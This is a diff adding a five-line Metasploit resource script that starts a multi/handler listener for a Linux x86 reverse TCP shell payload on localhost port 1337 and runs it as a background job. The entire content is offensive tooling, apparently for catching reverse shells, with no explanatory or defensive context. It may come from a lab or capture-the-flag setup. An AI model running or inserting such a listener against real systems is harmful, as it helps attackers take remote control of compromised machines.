@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload linux/x86/shell/reverse_tcp
+set lhost 127.0.0.1
+set lport 1337
+exploit -j -z
